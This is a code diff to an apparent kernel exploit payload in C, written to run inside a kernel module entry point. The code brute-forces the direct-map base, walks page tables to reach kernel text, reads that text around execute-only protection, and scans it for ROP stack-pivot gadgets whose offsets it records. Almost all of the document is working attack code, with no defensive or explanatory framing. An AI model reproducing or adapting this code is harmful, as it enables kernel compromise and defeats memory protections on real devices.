@@ -23,28 +23,32 @@
  *   [1]   kdata_base
  *   [2]   ktext_base
  *   [3]   cr3 value
- *   [4]   dmap_base (tried/confirmed)
+ *   [4]   dmap_base (confirmed, or default if not found)
  *   [5]   td_pcb
- *   [6]   phase (1=dmap_test, 2=pagewalk, 3=scanning, 4=done)
- *   [7]   pml4_entry_for_dmap (diagnostic)
- *   [8]   pml4_entry_for_ktext (diagnostic)
- *   [9]   first_ktext_page_pa
- *   [10]  dmap_read_test_result (0=OK, 1=fault, 2=wrong_data)
- *   [11]  first 8 bytes read from ktext (if readable!)
- *   [12]  num_pages_scanned
- *   [13]  num_gadgets_found
- *   [14]  first xchg_rsp_rax_ret offset (ktext-relative)
- *   [15]  first pop_rsp_ret offset
- *   [16]  first leave_ret offset
- *   [17..30] additional gadget offsets (up to 14 more)
- *   [31]  scan_error_code
- *   [32]  safe_read8 diagnostic (0xAAAA0001=ok, 0xDEAD0000=fault)
- *   [33]  kdata first 8 bytes (diagnostic)
- *   [34]  PCB first 8 bytes (diagnostic)
- *   [35]  DMAP indices_tried (how many PML4 slots scanned)
- *   [36]  DMAP found_idx (which PML4 index matched)
- *   [37..61] reserved
- *   [62]  dmap_test_readback (raw bytes from DMAP read)
+ *   [6]   phase (1=dmap_test, 2=pagewalk, 3=ktext_read, 4=done)
+ *   -- Phase 0 diagnostics --
+ *   [7]   safe_read8 diag (0xAAAA0001=ok, 0xDEAD0000=fault)
+ *   [8]   kdata first 8 bytes
+ *   [9]   PCB first 8 bytes
+ *   -- Phase 1: DMAP discovery --
+ *   [10]  indices_tried
+ *   [11]  found_idx (PML4 index)
+ *   [12]  pml4_dmap_entry (DMAP's own PML4 entry)
+ *   [13]  first_success_val (first readable PML4 entry)
+ *   [14]  error code if DMAP not found (0xDEAD0001)
+ *   -- Phase 2-3: ktext access --
+ *   [15]  pml4_ktext_entry
+ *   [16]  first_ktext_page_pa
+ *   [17]  error code if walk/read fails (0xDEAD0002/3)
+ *   [18]  first 8 bytes of ktext via DMAP
+ *   -- Phase 4: scan results --
+ *   [19]  num_pages_scanned / kdata_pa (if XOM)
+ *   [20]  num_gadgets_found / kdata_test (if XOM)
+ *   [21]  first xchg_rsp_rax_ret offset (ktext-relative)
+ *   [22]  first pop_rsp_ret offset
+ *   [23]  first leave_ret offset
+ *   [24]  num additional gadgets recorded
+ *   [25..60] gadget offsets (type in bits 48-51: 1=xchg,2=pop,3=mov)
  *   [63]  sentinel 0xdeadbeefcafe0025
  */
 
@@ -301,13 +305,21 @@ int module_start(kproc_args* args)
     /* Test with kdata_base — we know this is readable (we read td_pcb from it) */
     uint64_t diag_val = 0;
     int diag_ok = safe_read8(kdata_base, &diag_val);
-    out[32] = diag_ok ? 0xAAAA0001 : 0xDEAD0000;
-    out[33] = diag_val;  /* first 8 bytes of kdata */
+    out[7] = diag_ok ? 0xAAAA0001 : 0xDEAD0000;  /* safe_read8 diagnostic */
+    out[8] = diag_val;  /* first 8 bytes of kdata */
 
     /* Also test td_pcb itself */
     uint64_t diag_pcb = 0;
     safe_read8(td_pcb, &diag_pcb);
-    out[34] = diag_pcb;  /* first 8 bytes of PCB */
+    out[9] = diag_pcb;  /* first 8 bytes of PCB */
+
+    if (!diag_ok) {
+        /* safe_read8 itself is broken — no point continuing */
+        out[10] = 0xDEAD0000;
+        out32[1] = 0x0003;
+        out[63] = 0xdeadbeefcafe0025ULL;
+        return 0;
+    }
 
     /* ========== Phase 1: Find DMAP base by brute-force ========== */
 
@@ -317,68 +329,85 @@ int module_start(kproc_args* args)
     /*
      * DMAP maps all physical RAM at a fixed VA base aligned to 512GB (1 PML4 slot).
      * The base is kernel-half: PML4 indices 256..511.
-     * For each candidate PML4 index, compute candidate_base and try reading
-     * candidate_base + pml4_pa (the PML4 table itself via DMAP).
-     * If the read succeeds and the value looks like a present PML4 entry,
+     *
+     * Strategy: For each candidate PML4 index, compute candidate_base and try
+     * reading candidate_base + pml4_pa (the PML4 table itself via DMAP).
+     * If the read succeeds and the value looks like a present page table entry,
      * we found the DMAP base.
      *
-     * We read the PML4 entry at the CANDIDATE's OWN index — if this is truly
-     * DMAP, then pml4[candidate_idx] must be present (DMAP maps itself).
+     * We read PML4 entry 0 (kernel entry) through each candidate — if candidate
+     * is DMAP, then reading the PML4 via DMAP should give us a valid entry.
+     * PML4[0] is typically not present (NULL guard), but PML4[256+] should be.
+     * So we read PML4 entry 511 (ktext region) which must be present.
      */
     uint64_t pml4_dmap_entry = 0;
     uint32_t found_idx = 0;
-
-    /* Store how many indices we tried for diagnostics */
     uint32_t indices_tried = 0;
+    uint64_t first_success_val = 0;  /* diagnostic: first readable value */
+
+    /* ktext PML4 index — this MUST be present in any valid kernel page table */
+    uint64_t ktext_pml4_idx = (ktext_base >> PML4_SHIFT) & PT_INDEX_MASK;
 
     for (uint32_t idx = 256; idx < 510; idx++) {
         uint64_t candidate = 0xFFFF000000000000ULL | ((uint64_t)idx << PML4_SHIFT);
-        /* Try reading pml4[idx] via this candidate DMAP base */
-        uint64_t test_addr = candidate + pml4_pa + idx * 8;
+
+        /*
+         * Try reading a KNOWN-PRESENT PML4 entry (ktext's) through this
+         * candidate DMAP base. This avoids the chicken-and-egg problem:
+         * we don't need the DMAP PML4 entry to be at index `idx`.
+         */
+        uint64_t test_addr = candidate + pml4_pa + ktext_pml4_idx * 8;
         uint64_t entry = 0;
 
         indices_tried++;
 
-        if (safe_read8(test_addr, &entry) && (entry & PTE_PRESENT)) {
-            /* This read succeeded and entry is present — likely DMAP */
-            dmap_base = candidate;
-            pml4_dmap_entry = entry;
-            found_idx = idx;
-            dmap_accessible = 1;
-            break;
+        if (safe_read8(test_addr, &entry)) {
+            /* Read succeeded through this candidate */
+            if (!first_success_val) first_success_val = entry;
+
+            if (entry & PTE_PRESENT) {
+                /* Cross-validate: also read pml4[idx] (DMAP's own entry) */
+                uint64_t self_addr = candidate + pml4_pa + idx * 8;
+                uint64_t self_entry = 0;
+                if (safe_read8(self_addr, &self_entry) && (self_entry & PTE_PRESENT)) {
+                    dmap_base = candidate;
+                    pml4_dmap_entry = self_entry;
+                    found_idx = idx;
+                    dmap_accessible = 1;
+                    break;
+                }
+            }
         }
     }
 
     out[4] = dmap_base;
-    out[7] = pml4_dmap_entry;
-    out[35] = indices_tried;
-    out[36] = found_idx;
+    out[10] = indices_tried;
+    out[11] = found_idx;
+    out[12] = pml4_dmap_entry;
+    out[13] = first_success_val;
 
     if (!dmap_accessible) {
-        out[10] = 1;  /* DMAP not found in any PML4 slot */
-        out[31] = 0xDEAD0001;
+        out[14] = 0xDEAD0001;
         out32[1] = 0x0003;  /* partial result */
         out[63] = 0xdeadbeefcafe0025ULL;
         return 0;
     }
 
-    /* Read PML4 entry for ktext region */
-    uint64_t ktext_pml4_idx = (ktext_base >> PML4_SHIFT) & PT_INDEX_MASK;
+    /* Read PML4 entry for ktext region (now using confirmed DMAP) */
     uint64_t pml4_ktext_addr = dmap_base + pml4_pa + ktext_pml4_idx * 8;
     uint64_t pml4_ktext_entry = 0;
     safe_read8(pml4_ktext_addr, &pml4_ktext_entry);
-    out[8] = pml4_ktext_entry;
+    out[15] = pml4_ktext_entry;
 
     /* ========== Phase 2: Walk page tables for ktext ========== */
     out[6] = 2;
 
     /* Get PA of first ktext page */
     uint64_t first_ktext_pa = va_to_pa(ktext_base, dmap_base, cr3);
-    out[9] = first_ktext_pa;
+    out[16] = first_ktext_pa;
 
     if (!first_ktext_pa) {
-        out[10] = 2;  /* page walk failed */
-        out[31] = 0xDEAD0002;
+        out[17] = 0xDEAD0002;  /* page walk failed */
         out32[1] = 0x0003;
         out[63] = 0xdeadbeefcafe0025ULL;
         return 0;
@@ -390,20 +419,17 @@ int module_start(kproc_args* args)
     uint64_t ktext_dmap_addr = dmap_base + first_ktext_pa;
     uint64_t test_val = 0;
     int read_ok = safe_read8(ktext_dmap_addr, &test_val);
-    out[11] = test_val;
-    out[62] = test_val;  /* duplicate for easy viewing */
+    out[18] = test_val;  /* first 8 bytes of ktext via DMAP */
 
     if (!read_ok) {
-        out[10] = 1;  /* DMAP read of ktext faulted — XOM enforced */
-        out[31] = 0xDEAD0003;
+        out[17] = 0xDEAD0003;  /* DMAP read of ktext faulted — XOM enforced */
 
-        /* Fall back to reporting page walk results only */
         /* Try a known-readable kdata page for comparison */
         uint64_t kdata_pa = va_to_pa(kdata_base, dmap_base, cr3);
         uint64_t kdata_test = 0;
         safe_read8(dmap_base + kdata_pa, &kdata_test);
-        out[32] = kdata_pa;        /* kdata PA */
-        out[33] = kdata_test;      /* kdata bytes via DMAP (should work) */
+        out[19] = kdata_pa;        /* kdata PA */
+        out[20] = kdata_test;      /* kdata bytes via DMAP (should work) */
 
         out32[1] = 0x0003;  /* partial: DMAP works but ktext XOM enforced */
         out[63] = 0xdeadbeefcafe0025ULL;
@@ -411,7 +437,6 @@ int module_start(kproc_args* args)
     }
 
     /* ========== DMAP ktext read WORKS! Scan for gadgets ========== */
-    out[10] = 0;  /* success */
 
     /* Gadget patterns */
     static const uint8_t pat_xchg_rsp_rax[] = { 0x48, 0x94, 0xC3 };
@@ -422,7 +447,7 @@ int module_start(kproc_args* args)
     uint32_t num_pages = 0;
     uint32_t num_gadgets = 0;
     uint64_t first_xchg = 0, first_pop_rsp = 0, first_leave = 0;
-    uint32_t gadget_slot = 17;  /* output slots 17..30 for additional gadgets */
+    uint32_t gadget_slot = 25;  /* output slots 25..60 for additional gadgets */
 
     /* Scan ktext: 4KB at a time, up to 20MB (0x1400000 bytes / 5120 pages) */
     uint64_t ktext_size = 0x1400000;  /* 20MB, conservative */
@@ -462,7 +487,7 @@ int module_start(kproc_args* args)
             if (pos >= 0) {
                 uint64_t goff = off + chunk + pos;
                 if (!first_xchg) first_xchg = goff;
-                if (gadget_slot <= 30) out[gadget_slot++] = goff | (1ULL << 48);
+                if (gadget_slot <= 60) out[gadget_slot++] = goff | (1ULL << 48);
                 num_gadgets++;
             }
 
@@ -470,7 +495,7 @@ int module_start(kproc_args* args)
             if (pos >= 0) {
                 uint64_t goff = off + chunk + pos;
                 if (!first_pop_rsp) first_pop_rsp = goff;
-                if (gadget_slot <= 30) out[gadget_slot++] = goff | (2ULL << 48);
+                if (gadget_slot <= 60) out[gadget_slot++] = goff | (2ULL << 48);
                 num_gadgets++;
             }
 
@@ -485,7 +510,7 @@ int module_start(kproc_args* args)
             pos = find_pattern(buf, 64, pat_mov_rsp_rax, 4);
             if (pos >= 0) {
                 uint64_t goff = off + chunk + pos;
-                if (gadget_slot <= 30) out[gadget_slot++] = goff | (3ULL << 48);
+                if (gadget_slot <= 60) out[gadget_slot++] = goff | (3ULL << 48);
                 num_gadgets++;
             }
         }
@@ -493,16 +518,17 @@ int module_start(kproc_args* args)
         if (page_ok) num_pages++;
 
         /* Live progress */
-        out[12] = num_pages;
-        out[13] = num_gadgets;
+        out[19] = num_pages;
+        out[20] = num_gadgets;
     }
 
     out[6]  = 4;  /* phase 4: done */
-    out[12] = num_pages;
-    out[13] = num_gadgets;
-    out[14] = first_xchg;
-    out[15] = first_pop_rsp;
-    out[16] = first_leave;
+    out[19] = num_pages;
+    out[20] = num_gadgets;
+    out[21] = first_xchg;
+    out[22] = first_pop_rsp;
+    out[23] = first_leave;
+    out[24] = gadget_slot - 25;  /* num additional gadgets recorded */
 
     out32[1] = (first_xchg || first_pop_rsp) ? 0x0002 : 0x0001;
     out[63] = 0xdeadbeefcafe0025ULL;
